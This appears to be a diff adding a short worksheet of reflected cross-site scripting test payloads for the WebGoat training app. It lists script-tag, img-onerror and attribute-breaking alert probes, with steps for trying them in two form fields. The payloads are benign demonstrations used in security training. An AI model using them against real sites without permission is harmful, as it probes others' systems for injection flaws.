@@ -1,0 +1,37 @@
+=== Reflected XSS Test Payloads ===
+
+Try these payloads in BOTH fields (credit card number and access code):
+
+1. Basic alert:
+<script>alert('XSS')</script>
+
+2. Console log:
+<script>console.log('XSS')</script>
+
+3. Image onerror:
+<img src=x onerror=alert('XSS')>
+
+4. With valid-looking number prefix:
+4123<script>alert('XSS')</script>
+
+5. Event handler:
+" onload="alert('XSS')
+
+6. Simple tag:
+<b>test</b>
+
+Instructions:
+1. Open WebGoat in your browser
+2. Navigate to: Cross Site Scripting (XSS) -> Try It! Reflected XSS
+3. Test each payload in the "credit card number" field first
+4. Then test in the "access code" field
+5. Click submit after each test
+6. Look for:
+   - Alert popup appearing
+   - Console.log message in F12 console
+   - The payload being reflected in the page source (right-click -> View Page Source)
+
+The vulnerable field is the one where:
+- Your script executes (alert pops up)
+- OR your HTML tags render (like <b> making text bold)
+- OR you can see your unescaped payload in the page source
